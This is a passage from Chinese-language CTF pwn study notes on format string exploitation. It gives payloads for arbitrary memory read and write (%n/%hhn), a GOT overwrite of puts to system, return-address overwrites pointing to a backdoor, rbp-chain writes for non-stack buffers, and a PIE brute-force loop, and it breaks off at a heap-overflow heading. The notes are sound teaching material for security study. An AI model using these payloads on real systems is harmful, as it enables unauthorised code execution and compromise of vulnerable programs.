函数栈帧中的 ebp（该 ebp 指向 prev ebp 即 main 函数的 ebp）</li></ul><p><strong>实际示例</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%300c%3$hn</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=sc>&#39;A&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>string_len</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>//arg1: %300c指定&#39;A&#39;参数输出宽度300
</span></span></span><span class=line><span class=cl><span class=c1>//arg2: %3$hn向参数列表第3个参数string_len地址写入2字节, 将string_len改为0x012c即300
</span></span></span></code></pre></div></div><p><strong>32 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>printf</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%08x</span><span class=s2>.</span><span class=si>%08x</span><span class=s2>.</span><span class=si>%08x</span><span class=s2>&#34;</span><span class=p>);</span> <span class=c1># 直接栈上找参数，打印出栈上父函数的内容</span></span></span></code></pre></div></div><p>gdb 调试结果</p><img src=/img/pwn_note.zh-cn.assets/172844664601121.png alt=图片无法加载>
<img src=/img/pwn_note.zh-cn.assets/172844664601122.png alt=图片无法加载><p><strong>64 位</strong></p><p><code>%p</code>输出顺序是：<code>rdi, rsi, rdx, rcx, r8, r9, 栈rsp往rbp</code>，<code>rdi</code>可能作为输入的参数，不打印</p><h3 id=任意地址读>任意地址读</h3><p><strong>测试</strong></p><p>① 不断调整%后的数，打印出 addr 的地址形式值，同时保证整个 payload 是 8 的倍数，接着修改 p 为 s 和 n 分别进行字符串输出或写入</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijk&#34;</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;%22$p&#34;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;AAAAAAAABBB%10$s&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x404050</span><span class=p>)</span> <span class=c1># 偏移10个输出0x404050地址中的值, s改为n就是写入4字节(0x0000000b)</span></span></span></code></pre></div></div><p><strong>泄露 got 表地址</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 终端上用于测试 printf(input) 找到输入字符AAAA的偏移</span>
</span></span><span class=line><span class=cl><span class=n>AAAA</span><span class=o>%</span><span class=n>p</span> <span class=o>%</span><span class=n>p</span> <span class=o>%</span><span class=n>p</span> <span class=o>%</span><span class=n>p</span>
</span></span><span class=line><span class=cl><span class=n>AAAA0xab</span> <span class=mh>0xcd</span> <span class=mh>0xef</span> <span class=mh>0x41414141</span> <span class=c1># 此时偏移为4输出</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>got_addr</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;%4$s&#34;</span> <span class=c1># 利用 %4 偏移四个输出以该got_addr地址解析的值</span></span></span></code></pre></div></div><p>用户可构造格式化字符串，泄露 read 的 got 表地址</p><img src=/img/pwn_note.zh-cn.assets/172844664601123.png alt=图片无法加载><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>%n<span class=nv>$p</span> <span class=c1># 泄露栈中被视为第n+1个参数的值</span>
</span></span><span class=line><span class=cl>%n<span class=nv>$s</span> <span class=c1># 泄露栈中被视为第n+1个参数对应地址的内容</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>addr%k<span class=nv>$s</span><span class=se>\x</span><span class=m>00</span> <span class=c1># 获取地址addr对应值(addr为第k个参数): addr输入后也在栈上或寄存器参数中可用k找到</span>
</span></span><span class=line><span class=cl><span class=c1># addr可能较短而使得printf解析被0截断，导致输出失败</span>
</span></span><span class=line><span class=cl><span class=o>[</span>%k<span class=nv>$s</span><span class=o>(</span>padding<span class=o>)][(</span>addr<span class=o>)]</span></span></span></code></pre></div></div><h3 id=任意地址写>任意地址写</h3><p><strong>32 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1># 覆盖大数字</span>
</span></span><span class=line><span class=cl><span class=c1># 将大数字拆分多份分别覆盖, 以hhn写入32位数为例</span>
</span></span><span class=line><span class=cl><span class=c1># [addr][addr+1][addr+2][addr+3][pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> p32<span class=o>(</span>addr<span class=o>)</span> + b<span class=s1>&#39;a&#39;</span>*12 + b<span class=s1>&#39;$6%n&#39;</span> <span class=c1># 向addr中填入数字16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 覆盖小数字</span>
</span></span><span class=line><span class=cl><span class=c1># aa%k$n[padding][addr]</span>
</span></span><span class=line><span class=cl><span class=c1># aa%8 栈上占4字节, $naa 栈上占4字节, 所以addr为第 4+4 = 8个参数</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> b<span class=s1>&#39;aa%8$naa&#39;</span> + p32<span class=o>(</span>addr<span class=o>)</span> <span class=c1># 向addr中填入数字2</span></span></span></code></pre></div></div><p><strong>64 位</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 覆盖大数字 防止0截断addr放后面</span>
</span></span><span class=line><span class=cl><span class=c1># [pad1]%k$hhn[pad2]%(k+1)$hhn[pad3]%(k+2)$hhn[pad4]%(k+3)$hhn[pad][addr][addr+1][addr+2][addr+3]</span>
</span></span><span class=line><span class=cl><span class=c1># 11,12,13是需要调出来的偏移, +0x100是转换为正数</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;%</span><span class=si>{}</span><span class=s1>c%</span><span class=si>{}</span><span class=s1>$hhn&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>one_gadget</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mi>11</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;%</span><span class=si>{}</span><span class=s1>c%</span><span class=si>{}</span><span class=s1>$hhn&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(((</span><span class=n>one_gadget</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=n>one_gadget</span> <span class=o>&gt;&gt;</span> <span class=mi>0</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;%</span><span class=si>{}</span><span class=s1>c%</span><span class=si>{}</span><span class=s1>$hhn&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(((</span><span class=n>one_gadget</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=n>one_gadget</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x100</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>,</span> <span class=mi>13</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>((</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>/</span> <span class=mi>8</span> <span class=o>*</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>exit_hook</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>exit_hook</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>exit_hook</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 覆盖小数字</span>
</span></span><span class=line><span class=cl><span class=c1># aa%7$naa为8字节</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;aa%7$naa&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=c1># 向0xdeadbeef写入2</span></span></span></code></pre></div></div><p>下图为向 read 的 got 表中写入 8</p><img src=/img/pwn_note.zh-cn.assets/172844664601124.png alt=图片无法加载><p><strong>pwntools 工具</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fmtstr_payload</span><span class=p>(</span><span class=n>offset</span><span class=p>,</span> <span class=p>{</span><span class=n>address</span><span class=p>:</span><span class=n>data</span><span class=p>},</span> <span class=n>nubwritten</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>write_size</span><span class=o>=</span><span class=s1>&#39;byte&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># offset: 格式化字符串偏移:第几个参数</span>
</span></span><span class=line><span class=cl><span class=c1># numbwritten: printf已输出的字符个数</span>
</span></span><span class=line><span class=cl><span class=c1># write_size: 写入方式byte/short/int对应hhn/hn/n</span></span></span></code></pre></div></div><p><strong>全局变量</strong></p><p>当存在<strong>比较时</strong>可判断该变量是否为全局变量(<code>i</code>)，一般在 bss 段，若是则可以直接获取其地址进行格式化字符串覆盖绕过<strong>比较</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=p>.</span><span class=nl>bss</span><span class=p>:</span><span class=mo>00000000004040</span><span class=mi>8</span><span class=n>C</span> <span class=n>i</span>            <span class=n>dd</span> <span class=o>?</span>             <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=nl>main</span><span class=p>:</span><span class=n>loc_401404</span><span class=err>↑</span><span class=n>r</span></span></span></code></pre></div></div><p><strong>3 字节拆分</strong></p><ul><li>可向栈上写入 got 表地址，目的：覆盖 puts 的 got 表为 system</li><li><strong>注： libc 中两个函数之间最多差 3 字节，若只修改⼀次，只能改 4 字节，此时打印出的字符数可能上亿次，使得内存爆了，所以改两次，第一次改 1 字节，第二次改 2 字节</strong></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>])</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=c1># 栈上payload 偏移17, 18</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=n>system</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=si>}</span><span class=s1>c%17$hhn&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pad</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=p>((</span><span class=n>system</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffff</span><span class=p>)</span> <span class=o>-</span> <span class=p>(</span><span class=n>system</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span><span class=si>}</span><span class=s1>c%18$hn&#39;</span> <span class=c1># %c为叠加, 减去前面累计的值</span></span></span></code></pre></div></div><p><strong>一次改同链 2 次</strong></p><ul><li>printf 解析机制：其遇到第⼀个位置指定的格式化字符串%15$hn，就会把整个格式化字符串中所有位置指定字符⼀起解析</li><li>格式化字符串改同一条链子两次不能用 2 次<code>%$</code>，需要第一次改用<code>%</code>，第二次用<code>%$</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pay</span> <span class=o>=</span> <span class=s1>&#39;</span><span class=si>%c</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>13</span> <span class=o>+</span> <span class=sa>f</span><span class=s2>&#34;%</span><span class=si>{</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>&amp;</span><span class=mh>0xffff</span><span class=p>)</span> <span class=o>-</span> <span class=mi>13</span><span class=si>}</span><span class=s2>c%hn%</span><span class=si>{</span><span class=mh>0x10000</span><span class=o>-</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>&amp;</span><span class=mh>0xffff</span><span class=p>)</span><span class=si>}</span><span class=s2>c&#34;</span> <span class=c1># 15-&gt;47-&gt;9</span>
</span></span><span class=line><span class=cl><span class=c1># (13+2)使得%hn解析第15, %{0x10000-(ret_addr&amp;0xffff)}c: 格式化字符串的 %hn 最多截断16位: 0xffff, 补充输出字符使累积总数达到 0x10000字节来重置字符计数</span>
</span></span><span class=line><span class=cl><span class=n>pay</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=n>backdoor</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=si>}</span><span class=s1>c%47$hhn&#39;</span> <span class=c1># 47-&gt;9-&gt;backdoor</span>
</span></span><span class=line><span class=cl><span class=c1># 也可pay += &#39;%c&#39;*8 + &#34;%47$hhn&#34; 只更改最后一个字节为8</span></span></span></code></pre></div></div><h3 id=非栈上-fmt>非栈上 fmt</h3><p><strong>栈上相对地址写</strong></p><ul><li><code>printf(buf)</code>中，<code>buf</code>为全局变量或 malloc 在堆上导致不在栈上，不能直接在栈上布置要写入的地址，利用 rbp 链</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 链: ebp1 9 -&gt; ebp2 37 -&gt; 栈上地址A 每次改只改2字节</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=s2>&#34;%</span><span class=si>{}</span><span class=s2>c%9$hn&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>stack_addr</span> <span class=o>+</span> <span class=n>offset</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ebp1 -&gt; ebp2[change] &gt; 栈上地址B</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=s2>&#34;%</span><span class=si>{}</span><span class=s2>c%37$hn&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#         ebp2         &gt; 栈上地址B[change] &gt; value</span>
</span></span><span class=line><span class=cl><span class=c1># value 传入 target_address &gt;&gt; idx * 16 &amp; 0xFFFF</span></span></span></code></pre></div></div><p><strong>任意地址写</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 链: ebp1 -&gt; ebp2 -&gt; 栈上地址A -&gt; value</span>
</span></span><span class=line><span class=cl><span class=c1># 2次栈上相对地址写将A指向目标地址:    ebp1 -&gt; ebp2 -&gt; 栈上地址A -&gt; new_value_target_address</span>
</span></span><span class=line><span class=cl><span class=c1># 通过栈上地址A格式化字符串向目标地址写:ebp1 -&gt; ebp2 -&gt; 栈上地址A -&gt; new_value_target_address -&gt; new_value</span></span></span></code></pre></div></div><p><strong>多次利用链</strong></p><ul><li>有多次利用机会，目标为覆盖返回地址 9 为后门地址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 15 -&gt; 47 -&gt; xxx</span>
</span></span><span class=line><span class=cl><span class=n>rbp</span>     <span class=mi>8</span>  <span class=mh>0x7fffffffdfe0</span>
</span></span><span class=line><span class=cl>		<span class=mi>9</span>  <span class=mh>0x7fffffffdfe8</span> <span class=err>—▸</span> <span class=mh>0x4012ba</span> <span class=p>(</span><span class=n>main</span><span class=o>+</span><span class=mi>28</span><span class=p>)</span> <span class=err>◂—</span> <span class=n>mov</span>    <span class=n>eax</span><span class=p>,</span> <span class=mi>0</span> <span class=c1># 返回地址, 可选任意链中某个返回地址即可</span>
</span></span><span class=line><span class=cl>		   <span class=o>...</span>
</span></span><span class=line><span class=cl>        <span class=mi>15</span> <span class=mh>0x7fffffffe018</span> <span class=err>—▸</span> <span class=mh>0x7fffffffe118</span> <span class=err>—▸</span> <span class=mh>0x7fffffffe437</span> <span class=err>◂—</span> <span class=s1>&#39;/home/pwn&#39;</span> <span class=c1># 利用链</span>
</span></span><span class=line><span class=cl>           <span class=o>...</span>
</span></span><span class=line><span class=cl>        <span class=mi>47</span> <span class=mh>0x7fffffffe118</span> <span class=err>—▸</span> <span class=mh>0x7fffffffe437</span> <span class=err>◂—</span> <span class=s1>&#39;/home/pwn&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pwndbg中</span>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>fmtarg</span> <span class=mh>0x7fffffffdfe0</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>index</span> <span class=n>of</span> <span class=nb>format</span> <span class=n>argument</span> <span class=p>:</span> <span class=mi>9</span> <span class=p>(</span><span class=s2>&#34;\%8$p&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>fmtarg</span> <span class=mh>0x7fffffffe018</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>index</span> <span class=n>of</span> <span class=nb>format</span> <span class=n>argument</span> <span class=p>:</span> <span class=mi>16</span> <span class=p>(</span><span class=s2>&#34;\%15$p&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span> <span class=n>fmtarg</span> <span class=mh>0x7fffffffe118</span>
</span></span><span class=line><span class=cl><span class=n>The</span> <span class=n>index</span> <span class=n>of</span> <span class=nb>format</span> <span class=n>argument</span> <span class=p>:</span> <span class=mi>48</span> <span class=p>(</span><span class=s2>&#34;\%47$p&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p>利用过程：（本地环境和远程环境不一样时栈分布不一致，将导致可能本地打通远程打不通）</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;%8$p&#39;</span> 	<span class=c1># 泄露栈地址 stack = int(io.recv(12), 16) - 0x8, 此为返回地址9</span>
</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=n>stack</span> <span class=o>&amp;</span> <span class=mh>0xffff</span><span class=si>}</span><span class=s1>c%15$hn&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> 	<span class=c1># 15-&gt;47-&gt;? 更改为 15-&gt;47-&gt;9</span>
</span></span><span class=line><span class=cl><span class=n>payload3</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;%</span><span class=si>{</span><span class=n>backdoor</span> <span class=o>&amp;</span> <span class=mh>0xffff</span><span class=si>}</span><span class=s1>c%47$hn&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> 	<span class=c1># 47-&gt;9-&gt;(main+28) 更改为47-&gt;9-&gt;(backdoor)</span>
</span></span><span class=line><span class=cl><span class=c1># f&#39;%{func &amp; 0xffff}c%number$hn&#39;将func地址作为数值(16位)由%c写入栈中第number个参数指向的地址中</span></span></span></code></pre></div></div><p>当不能泄露栈地址时且开了 PIE，更改偏移覆盖返回地址为 backdoor 有 16 分之一的可能性爆破成功</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=o>...</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;cat flag&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvline_contains</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span></span></span></code></pre></div></div><h3 id=其他>其他</h3><p><strong>__printf_chk 函数泄露数据</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>__printf_chk</span><span class=p>(</span><span class=mi>1LL</span><span class=p>,</span> <span class=n>v</span><span class=p>);</span> <span class=c1>// 可以通过 %p 泄露libc地址
</span></span></span></code></pre></div></div><h2 id=堆溢出漏洞>堆溢出漏洞</h2><img src=/img/pwn_note.zh-cn.assets/172844670575344.png alt=图片无法加载><p><strong>调试</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
